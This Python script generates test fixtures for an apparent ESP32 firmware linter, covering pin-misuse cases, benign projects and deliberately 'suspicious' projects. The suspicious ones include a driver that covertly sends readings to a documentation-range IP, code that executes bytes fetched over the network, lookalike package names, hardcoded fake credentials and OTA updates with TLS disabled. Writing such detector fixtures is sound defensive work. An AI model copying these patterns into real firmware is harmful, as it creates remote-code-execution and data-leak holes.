"""(Re)generate the harmless test fixtures under tests/fixtures.

    python -m scripts.make_fixtures

All credentials are fake. Network endpoints use reserved documentation ranges
(203.0.113.0/24, example.com). No fixture contains working malicious behaviour: the
"suspicious" projects only contain the *code patterns* the rules look for, with inert data.
"""

from __future__ import annotations

import base64
import textwrap
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures"

INI = """[env:esp32dev]
platform = espressif32
board = {board}
framework = arduino
{extra}"""


def ini(board: str = "esp32dev", lib_deps: list[str] | None = None, extra: str = "") -> str:
    text = extra
    if lib_deps:
        text = "lib_deps =\n" + "".join(f"    {d}\n" for d in lib_deps) + extra
    return INI.format(board=board, extra=text)


def src(code: str) -> str:
    return textwrap.dedent(code).lstrip("\n")


# Inert payload for the encoded-data fixture: base64 of repeated plain text.
INERT_PAYLOAD = base64.b64encode(b"SHIPSAFE-INERT-TEST-DATA-" * 24).decode()

PROJECTS: dict[str, dict[str, str]] = {
    # ------------------------------------------------------------------ hardware
    "hardware/gpio34_output": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>

            void setup() {
              pinMode(34, OUTPUT);   // GPIO34 is input-only on ESP32
              digitalWrite(34, HIGH);
            }

            void loop() {}
            """),
    },
    "hardware/gpio34_input": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>

            void setup() {
              pinMode(34, INPUT);
              Serial.begin(115200);
            }

            void loop() {
              int level = digitalRead(34);
              uint16_t raw = analogRead(34);   // ADC1_CH6
              Serial.println(level + raw);
            }
            """),
    },
    "hardware/gpio23_output": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>

            const int RELAY_PIN = 23;

            void setup() {
              pinMode(RELAY_PIN, OUTPUT);
            }

            void loop() {
              digitalWrite(RELAY_PIN, HIGH);
              delay(1000);
              digitalWrite(RELAY_PIN, LOW);
              delay(1000);
            }
            """),
    },
    "hardware/pin_rules": {
        "platformio.ini": ini(extra="build_flags = -D STATUS_LED=12\n"),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <WiFi.h>
            #include <driver/gpio.h>

            #define FLASH_CLK_PIN 6
            int configuredPin = 5;              // not const: decided at run time

            int pinFromConfig() { return configuredPin; }

            void setup() {
              Serial.begin(115200);
              WiFi.begin("Lab", nullptr);
              pinMode(FLASH_CLK_PIN, OUTPUT);   // flash-connected
              pinMode(STATUS_LED, OUTPUT);      // GPIO12 strapping (MTDI)
              pinMode(20, OUTPUT);              // GPIO20 does not exist on ESP32
              pinMode(37, INPUT);               // chip pin, not a WROOM-32 module pin
              pinMode(pinFromConfig(), OUTPUT); // non-constant
              pinMode(35, INPUT_PULLUP);        // GPIO35 has no pull resistors
              dacWrite(4, 128);                 // GPIO4 has no DAC
              touchRead(26);                    // GPIO26 is not a touch pin
              gpio_set_direction(GPIO_NUM_39, GPIO_MODE_OUTPUT);
              pinMode(1, OUTPUT);               // UART0 TX while Serial is used
              pinMode(14, OUTPUT);              // JTAG MTMS
              attachInterrupt(36, nullptr, RISING);
            }

            void loop() {
              analogRead(25);                   // ADC2 while Wi-Fi is used
              analogRead(32);                   // ADC1: fine with Wi-Fi
              dacWrite(25, 10);                 // DAC_1: fine
              touchRead(4);                     // T0: fine
            }
            """),
    },
    "hardware/esp32s3_board": {
        "platformio.ini": ini(board="esp32-s3-devkitc-1"),
        "src/main.cpp": src("""
            #include <Arduino.h>
            void setup() { pinMode(34, OUTPUT); }
            void loop() {}
            """),
    },
    "hardware/unknown_board": {
        "platformio.ini": ini(board="my_custom_board_v9"),
        "src/main.cpp": src("""
            #include <Arduino.h>
            void setup() { pinMode(34, OUTPUT); }
            void loop() {}
            """),
    },
    # ------------------------------------------------------------------ benign
    "benign/normal_wifi_project": {
        "platformio.ini": ini(lib_deps=["bblanchon/ArduinoJson @ 7.4.3"]),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <WiFi.h>
            #include <WiFiClientSecure.h>
            #include <HTTPClient.h>
            #include <Preferences.h>

            // Credentials are provisioned at run time and stored in NVS, not in source code.
            Preferences prefs;
            extern const char ROOT_CA_PEM[];

            String readSetting(const char *key);

            void setup() {
              Serial.begin(115200);
              String ssid = readSetting("ssid");
              String password = readSetting("pass");
              WiFi.begin(ssid.c_str(), password.c_str());
            }

            void loop() {
              WiFiClientSecure client;
              client.setCACert(ROOT_CA_PEM);
              HTTPClient https;
              https.begin(client, "https://api.example.com/v1/weather");
              int status = https.GET();
              if (status == 200) {
                Serial.println(https.getString());
              }
              https.end();
              delay(60000);
            }
            """),
    },
    "benign/normal_sensor_project": {
        "platformio.ini": ini(lib_deps=["adafruit/Adafruit BME280 Library @ 2.3.0",
                                        "adafruit/Adafruit Unified Sensor @ 1.1.14"]),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <Wire.h>

            const int LIGHT_SENSOR_PIN = 34;   // ADC1_CH6, input only: read-only use is correct
            const int STATUS_LED_PIN = 23;

            void setup() {
              Serial.begin(115200);
              Wire.begin(21, 22);
              pinMode(STATUS_LED_PIN, OUTPUT);
              pinMode(LIGHT_SENSOR_PIN, INPUT);
            }

            void loop() {
              uint16_t light = analogRead(LIGHT_SENSOR_PIN);
              digitalWrite(STATUS_LED_PIN, light > 2000 ? HIGH : LOW);
              Serial.println(light);
              delay(500);
            }
            """),
    },
    "benign/normal_ota_project": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <WiFi.h>
            #include <WiFiClientSecure.h>
            #include <ArduinoOTA.h>
            #include <HTTPUpdate.h>

            extern const char UPDATE_SERVER_CA[];
            String loadOtaPassword();

            void setup() {
              ArduinoOTA.setHostname("greenhouse-node");
              ArduinoOTA.setPassword(loadOtaPassword().c_str());   // authenticated local OTA
              ArduinoOTA.begin();
            }

            void checkForUpdate() {
              WiFiClientSecure client;
              client.setCACert(UPDATE_SERVER_CA);                   // verified TLS
              httpUpdate.update(client, "https://updates.example.com/greenhouse.bin");
            }

            void loop() {
              ArduinoOTA.handle();
            }
            """),
    },
    # ------------------------------------------------------------------ suspicious indicators
    "suspicious_indicators/lookalike_package": {
        "platformio.ini": ini(lib_deps=["sensorlabs/Adafruit BME28O Library @ 1.0.0",
                                        "jsontools/ArduinoJsom @ 7.4.3",
                                        "adafruit/Adafruit Unified Sensor @ 1.1.14"]),
        "src/main.cpp": src("""
            #include <Arduino.h>
            void setup() { Serial.begin(115200); }
            void loop() {}
            """),
    },
    "suspicious_indicators/hardcoded_test_credential": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <WiFi.h>
            #include <HTTPClient.h>

            // FAKE test credentials - not real secrets
            #define WIFI_PASSWORD "FakePass-For-Tests-123"
            const char *ssid = "ShipSafeTestNet";
            const char *api_token = "sk_test_FAKE000000000000";
            const char *password_hint = "";          // empty: not a secret
            const char *mqtt_password = "changeme";   // placeholder value

            void setup() {
              Serial.begin(115200);
              WiFi.begin(ssid, WIFI_PASSWORD);
              Serial.print("Connecting with password ");
              Serial.println(WIFI_PASSWORD);           // secret written to the log
            }

            void loop() {
              HTTPClient http;
              http.begin("https://api.example.com/data");
              http.setAuthorization("admin", "FakeAdminPass-0000");
              http.addHeader("Authorization", String("Bearer ") + api_token);
              http.GET();
              http.end();
            }
            """),
    },
    "suspicious_indicators/unexpected_network_call": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <TempProbe.h>

            TempProbe probe(4);

            void setup() { Serial.begin(115200); }

            void loop() {
              Serial.println(probe.readCelsius());
              delay(1000);
            }
            """),
        "lib/TempProbe/library.properties": src("""
            name=TempProbe
            version=0.3.1
            author=Unknown
            sentence=Read a thermistor temperature probe.
            paragraph=Simple temperature sensor driver.
            category=Sensors
            """),
        "lib/TempProbe/src/TempProbe.h": src("""
            #pragma once
            #include <Arduino.h>

            class TempProbe {
            public:
              explicit TempProbe(int pin);
              float readCelsius();
            private:
              int pin_;
              void report(float value);
            };
            """),
        "lib/TempProbe/src/TempProbe.cpp": src("""
            #include "TempProbe.h"
            #include <WiFi.h>

            TempProbe::TempProbe(int pin) : pin_(pin) {}

            float TempProbe::readCelsius() {
              float value = analogRead(pin_) * 0.1f;
              report(value);
              return value;
            }

            // A temperature driver has no stated reason to open network connections.
            void TempProbe::report(float value) {
              WiFiClient client;
              if (client.connect("203.0.113.50", 8080)) {   // documentation-range address
                client.print(String(value));
                client.stop();
              }
            }
            """),
    },
    "suspicious_indicators/suspicious_encoded_data": {
        "platformio.ini": ini(),
        "src/main.cpp": src(f"""
            #include <Arduino.h>
            #include <Update.h>
            #include <mbedtls/base64.h>

            // Inert test data (base64 of repeated plain text), not a firmware image.
            static const char ENCODED_BLOB[] = "{INERT_PAYLOAD}";

            void applyEmbeddedImage() {{
              static unsigned char decoded[1024];
              size_t decodedLength = 0;
              mbedtls_base64_decode(decoded, sizeof(decoded), &decodedLength,
                                    (const unsigned char *)ENCODED_BLOB, strlen(ENCODED_BLOB));
              Update.begin(decodedLength);
              Update.write(decoded, decodedLength);    // decoded data written to flash
              Update.end(true);
            }}

            void setup() {{ applyEmbeddedImage(); }}
            void loop() {{}}
            """),
    },
    "suspicious_indicators/dynamic_execution": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <WiFi.h>
            #include <dlfcn.h>

            typedef void (*entry_fn)(void);
            static uint8_t codeBuffer[256];

            void fetchAndRun() {
              WiFiClient client;
              client.connect("203.0.113.7", 9000);
              int count = client.read(codeBuffer, sizeof(codeBuffer));   // bytes from the network
              entry_fn entry = (entry_fn)codeBuffer;                      // data buffer used as code
              if (count > 0) {
                entry();
              }
            }

            void loadPlugin() {
              void *handle = dlopen("plugin.so", RTLD_NOW);
              void *symbol = dlsym(handle, "plugin_main");
              (void)symbol;
            }

            void setup() { fetchAndRun(); loadPlugin(); }
            void loop() {}
            """),
    },
    "suspicious_indicators/firmware_operations": {
        "platformio.ini": ini(),
        "src/main.cpp": src("""
            #include <Arduino.h>
            #include <ArduinoOTA.h>
            #include <HTTPUpdate.h>
            #include <WiFiClientSecure.h>
            #include <esp_flash.h>
            #include <esp_efuse.h>
            #include <esp_ota_ops.h>

            extern const esp_efuse_desc_t *SOME_EFUSE_FIELD[];

            void setup() {
              ArduinoOTA.begin();                                     // no password set
              WiFiClientSecure insecureClient;
              insecureClient.setInsecure();                           // TLS verification disabled
              httpUpdate.update(insecureClient, "http://updates.example.com/fw.bin");   // plain HTTP
            }

            void maintenance() {
              esp_flash_erase_region(esp_flash_default_chip, 0x10000, 0x1000);
              esp_efuse_write_field_bit(SOME_EFUSE_FIELD);            // permanent
              esp_ota_set_boot_partition(esp_ota_get_next_update_partition(nullptr));
            }

            void loop() { ArduinoOTA.handle(); }
            """),
    },
}


def main() -> None:
    for name, files in PROJECTS.items():
        for rel, content in files.items():
            path = FIXTURES / name / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
    print(f"wrote {len(PROJECTS)} fixture projects to {FIXTURES.relative_to(ROOT)}")


if __name__ == "__main__":
    main()
